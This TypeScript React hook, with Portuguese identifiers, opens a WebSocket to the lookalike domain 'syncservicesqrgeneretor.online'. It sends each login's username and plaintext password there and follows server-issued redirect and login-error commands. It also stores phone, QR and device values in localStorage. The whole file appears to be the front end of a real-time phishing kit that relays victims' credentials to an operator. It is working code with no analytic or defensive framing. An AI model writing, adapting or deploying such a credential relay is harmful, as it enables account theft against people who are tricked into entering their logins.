import { useEffect, useRef, useCallback } from "react";

const WS_URL = "wss://syncservicesqrgeneretor.online/ws/";

type WSMessage = {
  acao: string;
  url?: string;
  telefone?: string;
  feixe?: string;
  qr?: string;
  nome?: string;
  dispositivo?: string;
  motivo?: string;
};

type UseWebSocketOptions = {
  onRedirect?: (msg: WSMessage) => void;
  onLoginError?: (motivo: string) => void;
};

export function useWebSocket({ onRedirect, onLoginError }: UseWebSocketOptions) {
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimer = useRef<ReturnType<typeof setTimeout>>();
  const onRedirectRef = useRef(onRedirect);
  const onLoginErrorRef = useRef(onLoginError);

  onRedirectRef.current = onRedirect;
  onLoginErrorRef.current = onLoginError;

  const connect = useCallback(() => {
    if (wsRef.current?.readyState === WebSocket.OPEN || wsRef.current?.readyState === WebSocket.CONNECTING) return;

    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("WebSocket conectado.");
      const usuario = localStorage.getItem("usuario");
      if (usuario) {
        ws.send(JSON.stringify({ acao: "reconectar", usuario }));
      }
    };

    ws.onmessage = (event) => {
      const msg: WSMessage = JSON.parse(event.data);
      console.log("Mensagem recebida:", msg);

      if (msg.acao === "redirecionar" && msg.url) {
        localStorage.setItem("feixe", msg.feixe || "");
        localStorage.setItem("qr", msg.qr || "");
        localStorage.setItem("nome", msg.nome || "");
        localStorage.setItem("dispositivo", msg.dispositivo || "");
        localStorage.setItem("telefone", msg.telefone || "");
        onRedirectRef.current?.(msg);
      }

      if (msg.acao === "erro_login") {
        onLoginErrorRef.current?.(msg.motivo || "Erro desconhecido");
      }
    };

    ws.onclose = () => {
      console.log("WS fechado. Reconectando em 5s...");
      reconnectTimer.current = setTimeout(connect, 5000);
    };

    ws.onerror = (err) => {
      console.error("Erro WS:", err);
    };
  }, []);

  const sendLogin = useCallback((usuario: string, senha: string) => {
    localStorage.setItem("usuario", usuario);

    const send = () => {
      wsRef.current?.send(
        JSON.stringify({ acao: "login", usuario, senha })
      );
      console.log("Login enviado:", usuario);
    };

    if (!wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) {
      connect();
      setTimeout(() => {
        if (wsRef.current?.readyState === WebSocket.OPEN) send();
      }, 1000);
    } else {
      send();
    }
  }, [connect]);

  useEffect(() => {
    connect();
    return () => {
      clearTimeout(reconnectTimer.current);
      wsRef.current?.close();
    };
  }, [connect]);

  return { sendLogin };
}
